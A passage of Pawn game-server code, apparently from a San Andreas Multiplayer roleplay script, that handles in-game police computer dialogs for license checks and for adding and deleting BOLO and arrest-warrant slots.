				if(PlayerInfo[giveplayerid][pCarLic] == 3) { text1 = "Cancelled"; }
				if(PlayerInfo[giveplayerid][pFlyLic]) { text4 = "Passed"; } else { text4 = "Not Passed"; }
				if(PlayerInfo[giveplayerid][pBoatLic]) { text2 = "Passed"; } else { text2 = "Not Passed"; }
				format(string, sizeof(string), "   Name: %s\n", giveplayer);
				strcat(LicenseString, string, sizeof(LicenseString));
				format(string, sizeof(string), "-Drivers License: %s.\n", text1);
				strcat(LicenseString, string, sizeof(LicenseString));
				format(string, sizeof(string), "-Flying License: %s.\n", text4);
				strcat(LicenseString, string, sizeof(LicenseString));
				format(string, sizeof(string), "-Sailing License: %s.\n", text2);
				strcat(LicenseString, string, sizeof(LicenseString));
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_LIST, "SA-MDC - Logged in | Criminal History", LicenseString, "OK", "Cancel");
				format(string, sizeof(string), "** DISPATCH: %s has ran a license check on %s **", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid));
				SendRadioMessage(1, COLOR_DBLUE, string);
				SendRadioMessage(2, COLOR_DBLUE, string);
				return 1;
			}
			else return ShowPlayerDialogEx(playerid, MDC_LICENSES, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | Error!", "ERROR: Invalid Name or ID No.\nEnter the Person's Name or ID No.", "Enter", "Cancel");
		}
		else return ShowPlayerDialogEx(playerid, MDC_LICENSES, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | Error!", "ERROR: Invalid Name or ID No.\nEnter the Person's Name or ID No.", "Enter", "Cancel");
	}
	if(dialogid == MDC_BOLO && response)
	{
		new x_nr = GetPVarInt(playerid, "BOLOISSUESLOT");
		if(x_nr == 1)
		{
			if(News[hTaken14] == 0)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(strlen(inputtext) < 9) { ShowPlayerDialogEx(playerid, MDC_BOLO, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | ERROR", "ERROR: Must Be 9+ characters\nEnter BOLO Details", "Enter", "Cancel"); return 1; }
				format(string, sizeof(string), "%s",inputtext); strmid(News[hAdd14], string, 0, strlen(string), 255);
				format(string, sizeof(string), "%s",sendername); strmid(News[hContact14], string, 0, strlen(string), 255);
				News[hTaken14] = 1;
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | Success! ","* You placed details for a BOLO on the MDC -BOLO\nto see the current BOLO List browse to BOLO when logged in to the mdc", "OK", "Back");
				SendRadioMessage(1, COLOR_LIGHTBLUE, "** MDC: Details for a BOLO have been updated.");
				SendRadioMessage(2, COLOR_LIGHTBLUE, "** MDC: Details for a BOLO have been updated.");
				return 1;
			}
			else
			{
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | Error! ", "Spot 1 is already Taken!", "OK", "Back");
				return 1;
			}
		}
		if(x_nr == 2)
		{
			if(News[hTaken15] == 0)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(strlen(inputtext) < 9) { ShowPlayerDialogEx(playerid, MDC_BOLO, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | ERROR", "ERROR: Must Be 9+ characters\nEnter BOLO Details", "Enter", "Cancel"); return 1; }
				format(string, sizeof(string), "%s",inputtext); strmid(News[hAdd15], string, 0, strlen(string), 255);
				format(string, sizeof(string), "%s",sendername); strmid(News[hContact15], string, 0, strlen(string), 255);
				News[hTaken15] = 1;
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | Success! ","* You placed details for a BOLO on the MDC -BOLO\nto see the current BOLO List browse to BOLO when logged in to the mdc", "OK", "Back");
				SendRadioMessage(1, COLOR_LIGHTBLUE, "** MDC: Details for a BOLO have been updated.");
				SendRadioMessage(2, COLOR_LIGHTBLUE, "** MDC: Details for a BOLO have been updated.");
				return 1;
			}
			else
			{
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | Error! ", "Spot 2 is already Taken!", "OK", "Back");
				return 1;
			}
		}
		if(x_nr == 3)
		{
			if(News[hTaken16] == 0)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(strlen(inputtext) < 9) { ShowPlayerDialogEx(playerid, MDC_BOLO, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | ERROR", "ERROR: Must Be 9+ characters\nEnter BOLO Details", "Enter", "Cancel"); return 1; }
				format(string, sizeof(string), "%s",inputtext); strmid(News[hAdd16], string, 0, strlen(string), 255);
				format(string, sizeof(string), "%s",sendername); strmid(News[hContact16], string, 0, strlen(string), 255);
				News[hTaken16] = 1;
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | Success! ","* You placed details for a BOLO on the MDC -BOLO\nto see the current BOLO List browse to BOLO when logged in to the mdc", "OK", "Back");
				SendRadioMessage(1, COLOR_LIGHTBLUE, "** MDC: Details for a BOLO have been updated.");
				SendRadioMessage(2, COLOR_LIGHTBLUE, "** MDC: Details for a BOLO have been updated.");
				return 1;
			}
			else
			{
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | Error! ", "Spot 3 is already Taken!", "OK", "Back");
				return 1;
			}
		}
		if(x_nr == 4)
		{
			if(News[hTaken17] == 0)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(strlen(inputtext) < 9) { ShowPlayerDialogEx(playerid, MDC_BOLO, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | ERROR", "ERROR: Must Be 9+ characters\nEnter BOLO Details", "Enter", "Cancel"); return 1; }
				format(string, sizeof(string), "%s",inputtext); strmid(News[hAdd17], string, 0, strlen(string), 255);
				format(string, sizeof(string), "%s",sendername); strmid(News[hContact17], string, 0, strlen(string), 255);
				News[hTaken17] = 1;
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | Success! ","* You placed details for a BOLO on the MDC -BOLO\nto see the current BOLO List browse to BOLO when logged in to the mdc", "OK", "Back");
				SendRadioMessage(1, COLOR_LIGHTBLUE, "** MDC: Details for a BOLO have been updated.");
				SendRadioMessage(2, COLOR_LIGHTBLUE, "** MDC: Details for a BOLO have been updated.");
				return 1;
			}
			else
			{
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | Error! ", "Spot 4 is already Taken!", "OK", "Back");
				return 1;
			}
		}
		if(x_nr == 5)
		{
			if(News[hTaken18] == 0)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(strlen(inputtext) < 9) { ShowPlayerDialogEx(playerid, MDC_BOLO, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | ERROR", "ERROR: Must Be 9+ characters\nEnter BOLO Details", "Enter", "Cancel"); return 1; }
				format(string, sizeof(string), "%s",inputtext); strmid(News[hAdd18], string, 0, strlen(string), 255);
				format(string, sizeof(string), "%s",sendername); strmid(News[hContact18], string, 0, strlen(string), 255);
				News[hTaken18] = 1;
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | Success! ","* You placed details for a BOLO on the MDC -BOLO\nto see the current BOLO List browse to BOLO when logged in to the mdc", "OK", "Back");
				SendRadioMessage(1, COLOR_LIGHTBLUE, "** MDC: Details for a BOLO have been updated.");
				SendRadioMessage(2, COLOR_LIGHTBLUE, "** MDC: Details for a BOLO have been updated.");
				return 1;
			}
			else
			{
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | Error! ", "Spot 5 is already Taken!", "OK", "Back");
				return 1;
			}
		}
		if(x_nr == 6)
		{
			if(News[hTaken19] == 0)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(strlen(inputtext) < 9) { ShowPlayerDialogEx(playerid, MDC_BOLO, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | ERROR", "ERROR: Must Be 9+ characters\nEnter BOLO Details", "Enter", "Cancel"); return 1; }
				format(string, sizeof(string), "%s",inputtext); strmid(News[hAdd19], string, 0, strlen(string), 255);
				format(string, sizeof(string), "%s",sendername); strmid(News[hContact19], string, 0, strlen(string), 255);
				News[hTaken19] = 1;
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | Success! ","* You placed details for a BOLO on the MDC -BOLO\nto see the current BOLO List browse to BOLO when logged in to the mdc", "OK", "Back");
				SendRadioMessage(1, COLOR_LIGHTBLUE, "** MDC: Details for a BOLO have been updated.");
				SendRadioMessage(2, COLOR_LIGHTBLUE, "** MDC: Details for a BOLO have been updated.");
				return 1;
			}
			else
			{
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | Error! ", "Spot 6 is already Taken!", "OK", "Back");
				return 1;
			}
		}
		if(x_nr == 7)
		{
			if(News[hTaken20] == 0)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(strlen(inputtext) < 9) { ShowPlayerDialogEx(playerid, MDC_BOLO, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | ERROR", "ERROR: Must Be 9+ characters\nEnter BOLO Details", "Enter", "Cancel"); return 1; }
				format(string, sizeof(string), "%s",inputtext); strmid(News[hAdd20], string, 0, strlen(string), 255);
				format(string, sizeof(string), "%s",sendername); strmid(News[hContact20], string, 0, strlen(string), 255);
				News[hTaken20] = 1;
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | Success! ","* You placed details for a BOLO on the MDC -BOLO\nto see the current BOLO List browse to BOLO when logged in to the mdc", "OK", "Back");
				SendRadioMessage(1, COLOR_LIGHTBLUE, "** MDC: Details for a BOLO have been updated.");
				SendRadioMessage(2, COLOR_LIGHTBLUE, "** MDC: Details for a BOLO have been updated.");
				return 1;
			}
			else
			{
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | Error! ", "Spot 7 is already Taken!", "OK", "Back");
				return 1;
			}
		}
		if(x_nr == 8)
		{
			if(News[hTaken21] == 0)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(strlen(inputtext) < 9) { ShowPlayerDialogEx(playerid, MDC_BOLO, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | ERROR", "ERROR: Must Be 9+ characters\nEnter BOLO Details", "Enter", "Cancel"); return 1; }
				format(string, sizeof(string), "%s",inputtext); strmid(News[hAdd21], string, 0, strlen(string), 255);
				format(string, sizeof(string), "%s",sendername); strmid(News[hContact21], string, 0, strlen(string), 255);
				News[hTaken21] = 1;
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | Success! ","* You placed details for a BOLO on the MDC -BOLO\nto see the current BOLO List browse to BOLO when logged in to the mdc", "OK", "Back");
				SendRadioMessage(1, COLOR_LIGHTBLUE, "** MDC: Details for a BOLO have been updated.");
				SendRadioMessage(2, COLOR_LIGHTBLUE, "** MDC: Details for a BOLO have been updated.");
				return 1;
			}
			else
			{
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | Error! ", "Spot 8 is already Taken!", "OK", "Back");
				return 1;
			}
		}
	}
	if(dialogid == MDC_BOLO_SLOT && response)
	{
	    SetPVarInt(playerid, "BOLOISSUESLOT", listitem + 1);
	    ShowPlayerDialogEx(playerid, MDC_BOLO, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | Issue Warrant", "Enter BOLO Details", "Enter", "Cancel");
	}
	if(dialogid == MDC_ISSUE_SLOT && response)
	{
	    SetPVarInt(playerid, "ISSUESLOT", listitem + 1);
	    ShowPlayerDialogEx(playerid, MDC_ISSUE, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | Issue Warrant", "Enter Arrest Warrant Details", "Enter", "Cancel");
	}
	if(dialogid == MDC_END_ID && response)
	{
		ShowPlayerDialogEx(playerid, MDC_MAIN, DIALOG_STYLE_LIST, "SA-MDC - Logged in", "*Find LEO\n*Civilian Information\n*Law Enforcement Agencies\n*MDC Message\n*SMS", "OK", "Cancel");
	}
	if(dialogid == MDC_ISSUE && response)
	{
		new x_nr = GetPVarInt(playerid, "ISSUESLOT");
		if(x_nr == 1)
		{
			if(News[hTaken6] == 0)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(strlen(inputtext) < 9) { ShowPlayerDialogEx(playerid, MDC_ISSUE, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | ERROR", "ERROR: Must Be 9+ characters\nEnter Arrest Warrant Details", "Enter", "Cancel"); return 1; }
				format(string, sizeof(string), "%s",inputtext); strmid(News[hAdd6], string, 0, strlen(string), 255);
				format(string, sizeof(string), "%s",sendername); strmid(News[hContact6], string, 0, strlen(string), 255);
				News[hTaken6] = 1;
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | Success! ","* You placed details for an arrest warrant on the MDC -Warrants\nto see the current Warrants browse to Warrants when logged in to the mdc", "OK", "Back");
				SendRadioMessage(1, COLOR_LIGHTBLUE, "** MDC: Details for an arrest warrant have been updated.");
				SendRadioMessage(2, COLOR_LIGHTBLUE, "** MDC: Details for an arrest warrant have been updated.");
				return 1;
			}
			else
			{
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | Error! ", "Spot 1 is already Taken!", "OK", "Back");
				return 1;
			}
		}
		if(x_nr == 2)
		{
			if(News[hTaken7] == 0)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(strlen(inputtext) < 9) { ShowPlayerDialogEx(playerid, MDC_ISSUE, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | ERROR", "ERROR: Must Be 9+ characters\nEnter Arrest Warrant Details", "Enter", "Cancel"); return 1; }
				format(string, sizeof(string), "%s",inputtext); strmid(News[hAdd7], string, 0, strlen(string), 255);
				format(string, sizeof(string), "%s",sendername); strmid(News[hContact7], string, 0, strlen(string), 255);
				News[hTaken7] = 1;
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | Success! ","* You placed details for an arrest warrant on the MDC -Warrants\nto see the current Warrants browse to Warrants when logged in to the mdc", "OK", "Back");
				SendRadioMessage(1, COLOR_LIGHTBLUE, "** MDC: Details for an arrest warrant have been updated.");
				SendRadioMessage(2, COLOR_LIGHTBLUE, "** MDC: Details for an arrest warrant have been updated.");
				return 1;
			}
			else
			{
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | Error! ", "Spot 2 is already Taken!", "OK", "Back");
				return 1;
			}
		}
		if(x_nr == 3)
		{
			if(News[hTaken8] == 0)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(strlen(inputtext) < 9) { ShowPlayerDialogEx(playerid, MDC_ISSUE, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | ERROR", "ERROR: Must Be 9+ characters\nEnter Arrest Warrant Details", "Enter", "Cancel"); return 1; }
				format(string, sizeof(string), "%s",inputtext); strmid(News[hAdd8], string, 0, strlen(string), 255);
				format(string, sizeof(string), "%s",sendername); strmid(News[hContact8], string, 0, strlen(string), 255);
				News[hTaken8] = 1;
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | Success! ","* You placed details for an arrest warrant on the MDC -Warrants\nto see the current Warrants browse to Warrants when logged in to the mdc", "OK", "Back");
				SendRadioMessage(1, COLOR_LIGHTBLUE, "** MDC: Details for an arrest warrant have been updated.");
				SendRadioMessage(2, COLOR_LIGHTBLUE, "** MDC: Details for an arrest warrant have been updated.");
				return 1;
			}
			else
			{
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | Error! ", "Spot 3 is already Taken!", "OK", "Back");
				return 1;
			}
		}
		if(x_nr == 4)
		{
			if(News[hTaken9] == 0)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(strlen(inputtext) < 9) { ShowPlayerDialogEx(playerid, MDC_ISSUE, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | ERROR", "ERROR: Must Be 9+ characters\nEnter Arrest Warrant Details", "Enter", "Cancel"); return 1; }
				format(string, sizeof(string), "%s",inputtext); strmid(News[hAdd9], string, 0, strlen(string), 255);
				format(string, sizeof(string), "%s",sendername); strmid(News[hContact9], string, 0, strlen(string), 255);
				News[hTaken9] = 1;
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | Success! ","* You placed details for an arrest warrant on the MDC -Warrants\nto see the current Warrants browse to Warrants when logged in to the mdc", "OK", "Back");
				SendRadioMessage(1, COLOR_LIGHTBLUE, "** MDC: Details for an arrest warrant have been updated.");
				SendRadioMessage(2, COLOR_LIGHTBLUE, "** MDC: Details for an arrest warrant have been updated.");
				return 1;
			}
			else
			{
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | Error! ", "Spot 4 is already Taken!", "OK", "Back");
				return 1;
			}
		}
		if(x_nr == 5)
		{
			if(News[hTaken10] == 0)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(strlen(inputtext) < 9) { ShowPlayerDialogEx(playerid, MDC_ISSUE, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | ERROR", "ERROR: Must Be 9+ characters\nEnter Arrest Warrant Details", "Enter", "Cancel"); return 1; }
				format(string, sizeof(string), "%s",inputtext); strmid(News[hAdd10], string, 0, strlen(string), 255);
				format(string, sizeof(string), "%s",sendername); strmid(News[hContact10], string, 0, strlen(string), 255);
				News[hTaken10] = 1;
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | Success! ","* You placed details for an arrest warrant on the MDC -Warrants\nto see the current Warrants browse to Warrants when logged in to the mdc", "OK", "Back");
				SendRadioMessage(1, COLOR_LIGHTBLUE, "** MDC: Details for an arrest warrant have been updated.");
				SendRadioMessage(2, COLOR_LIGHTBLUE, "** MDC: Details for an arrest warrant have been updated.");
				return 1;
			}
			else
			{
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | Error! ", "Spot 5 is already Taken!", "OK", "Back");
				return 1;
			}
		}
		if(x_nr == 6)
		{
			if(News[hTaken11] == 0)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(strlen(inputtext) < 9) { ShowPlayerDialogEx(playerid, MDC_ISSUE, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | ERROR", "ERROR: Must Be 9+ characters\nEnter Arrest Warrant Details", "Enter", "Cancel"); return 1; }
				format(string, sizeof(string), "%s",inputtext); strmid(News[hAdd11], string, 0, strlen(string), 255);
				format(string, sizeof(string), "%s",sendername); strmid(News[hContact11], string, 0, strlen(string), 255);
				News[hTaken11] = 1;
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | Success! ","* You placed details for an arrest warrant on the MDC -Warrants\nto see the current Warrants browse to Warrants when logged in to the mdc", "OK", "Back");
				SendRadioMessage(1, COLOR_LIGHTBLUE, "** MDC: Details for an arrest warrant have been updated.");
				SendRadioMessage(2, COLOR_LIGHTBLUE, "** MDC: Details for an arrest warrant have been updated.");
				return 1;
			}
			else
			{
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | Error! ", "Spot 6 is already Taken!", "OK", "Back");
				return 1;
			}
		}
		if(x_nr == 7)
		{
			if(News[hTaken12] == 0)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(strlen(inputtext) < 9) { ShowPlayerDialogEx(playerid, MDC_ISSUE, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | ERROR", "ERROR: Must Be 9+ characters\nEnter Arrest Warrant Details", "Enter", "Cancel"); return 1; }
				format(string, sizeof(string), "%s",inputtext); strmid(News[hAdd12], string, 0, strlen(string), 255);
				format(string, sizeof(string), "%s",sendername); strmid(News[hContact12], string, 0, strlen(string), 255);
				News[hTaken12] = 1;
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | Success! ","* You placed details for an arrest warrant on the MDC -Warrants\nto see the current Warrants browse to Warrants when logged in to the mdc", "OK", "Back");
				SendRadioMessage(1, COLOR_LIGHTBLUE, "** MDC: Details for an arrest warrant have been updated.");
				SendRadioMessage(2, COLOR_LIGHTBLUE, "** MDC: Details for an arrest warrant have been updated.");
				return 1;
			}
			else
			{
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | Error! ", "Spot 7 is already Taken!", "OK", "Back");
				return 1;
			}
		}
		if(x_nr == 8)
		{
			if(News[hTaken13] == 0)
			{
				GetPlayerName(playerid, sendername, sizeof(sendername));
				if(strlen(inputtext) < 9) { ShowPlayerDialogEx(playerid, MDC_ISSUE, DIALOG_STYLE_INPUT, "SA-MDC - Logged in | ERROR", "ERROR: Must Be 9+ characters\nEnter Arrest Warrant Details", "Enter", "Cancel"); return 1; }
				format(string, sizeof(string), "%s",inputtext); strmid(News[hAdd13], string, 0, strlen(string), 255);
				format(string, sizeof(string), "%s",sendername); strmid(News[hContact13], string, 0, strlen(string), 255);
				News[hTaken13] = 1;
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | Success! ","* You placed details for an arrest warrant on the MDC -Warrants\nto see the current Warrants browse to Warrants when logged in to the mdc", "OK", "Back");
				SendRadioMessage(1, COLOR_LIGHTBLUE, "** MDC: Details for an arrest warrant have been updated.");
				SendRadioMessage(2, COLOR_LIGHTBLUE, "** MDC: Details for an arrest warrant have been updated.");
				return 1;
			}
			else
			{
				ShowPlayerDialogEx(playerid, MDC_END_ID, DIALOG_STYLE_MSGBOX, "SA-MDC - Logged in | Error! ", "Spot 8 is already Taken!", "OK", "Back");
				return 1;
			}
		}
	}
	if(dialogid == MDC_DELETE && response)
	{
	    if(listitem == 0)
	    {
	    	ShowPlayerDialogEx(playerid, MDC_DEL_BOLO, DIALOG_STYLE_LIST, "SA-MDC - Logged in | Which BOLO Slot would you like to delete?", "1\n2\n3\n4\n5\n6\n7\n8\nALL", "Enter", "Cancel");
	    }
		if(listitem == 1)
		{
			ShowPlayerDialogEx(playerid, MDC_DEL_WARRANT, DIALOG_STYLE_LIST, "SA-MDC - Logged in | Which Warrant Slot would you like to delete?", "1\n2\n3\n4\n5\n6\n7\n8\nALL", "Enter", "Cancel");
		}
	}
	if(dialogid == MDC_DEL_BOLO && response)
	{
		new string1[MAX_PLAYER_NAME];
		if(isnull(inputtext))
		{
			ShowPlayerDialogEx(playerid, MDC_DEL_WARRANT, DIALOG_STYLE_LIST, "SA-MDC - Logged in | Which Warrant Slot would you like to delete?", "1\n2\n3\n4\n5\n6\n7\n8\nALL", "Enter", "Cancel");
			return 1;
		}
		if(strcmp(inputtext, "1") == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd14], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "No-one");	strmid(News[hContact14], string1, 0, strlen(string1), 255);
			News[hTaken14] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You deleted details for Be on the Lookout (1) from the MDC -BOLO.");
			return 1;
		}
		else if(strcmp(inputtext, "2") == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd15], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "No-one");	strmid(News[hContact15], string1, 0, strlen(string1), 255);
			News[hTaken15] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You deleted details for Be on the Lookout (2) from the MDC -BOLO.");
			return 1;
		}
		else if(strcmp(inputtext, "3") == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd16], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "No-one");	strmid(News[hContact16], string1, 0, strlen(string1), 255);
			News[hTaken16] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You deleted details for Be on the Lookout (3) from the MDC -BOLO.");
			return 1;
		}
		else if(strcmp(inputtext, "4") == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd17], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "No-one");	strmid(News[hContact17], string1, 0, strlen(string1), 255);
			News[hTaken17] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You deleted details for Be on the Lookout (4) from the MDC -BOLO.");
			return 1;
		}
		else if(strcmp(inputtext, "5") == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd18], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "No-one");	strmid(News[hContact18], string1, 0, strlen(string1), 255);
			News[hTaken18] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You deleted details for Be on the Lookout (5) from the MDC -BOLO.");
			return 1;
		}
		else if(strcmp(inputtext, "6") == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd19], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "No-one");	strmid(News[hContact19], string1, 0, strlen(string1), 255);
			News[hTaken19] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You deleted details for Be on the Lookout (6) from the MDC -BOLO.");
			return 1;
		}
		else if(strcmp(inputtext, "7") == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd20], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "No-one");	strmid(News[hContact20], string1, 0, strlen(string1), 255);
			News[hTaken20] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You deleted details for Be on the Lookout (7) from the MDC -BOLO.");
			return 1;
		}
		else if(strcmp(inputtext, "8") == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd21], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "No-one");	strmid(News[hContact21], string1, 0, strlen(string1), 255);
			News[hTaken21] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You deleted details for Be on the Lookout (8) from the MDC -BOLO.");
			return 1;
		}
		else if(strcmp(inputtext,"all",true) == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd14], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "No-one");	strmid(News[hContact14], string1, 0, strlen(string1), 255);
			News[hTaken14] = 0;
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd15], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "No-one");	strmid(News[hContact15], string1, 0, strlen(string1), 255);
			News[hTaken15] = 0;
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd16], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "No-one");	strmid(News[hContact16], string1, 0, strlen(string1), 255);
			News[hTaken16] = 0;
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd17], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "No-one");	strmid(News[hContact17], string1, 0, strlen(string1), 255);
			News[hTaken17] = 0;
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd18], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "No-one");	strmid(News[hContact18], string1, 0, strlen(string1), 255);
			News[hTaken18] = 0;
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd19], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "No-one");	strmid(News[hContact19], string1, 0, strlen(string1), 255);
			News[hTaken19] = 0;
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd20], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "No-one");	strmid(News[hContact20], string1, 0, strlen(string1), 255);
			News[hTaken20] = 0;
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd21], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "No-one");	strmid(News[hContact21], string1, 0, strlen(string1), 255);
			News[hTaken21] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You deleted all the details for Be on the Lookout from the MDC -BOLO.");
			return 1;
		}
	}
	if(dialogid == MDC_DEL_WARRANT && response)
	{
	    new string1[MAX_PLAYER_NAME];
		if(isnull(inputtext))
		{
			ShowPlayerDialogEx(playerid, MDC_DEL_WARRANT, DIALOG_STYLE_LIST, "SA-MDC - Logged in | Which Warrant Slot would you like to delete?", "1\n2\n3\n4\n5\n6\n7\n8\nALL", "Enter", "Cancel");
			return 1;
		}
		if(strcmp(inputtext,"1",true) == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd6], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "No-one");	strmid(News[hContact6], string1, 0, strlen(string1), 255);
			News[hTaken6] = 0;
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You deleted details for Arrest Warrant (1) from the MDC -Warrants.");
			return 1;
		}
		else if(strcmp(inputtext,"2",true) == 0)
		{
			format(string, sizeof(string), "Nothing"); strmid(News[hAdd7], string, 0, strlen(string), 255);
			format(string1, sizeof(string1), "No-one");	strmid(News[hContact7], string1, 0, strlen(string1), 255);
			News[hTaken7] = 0;
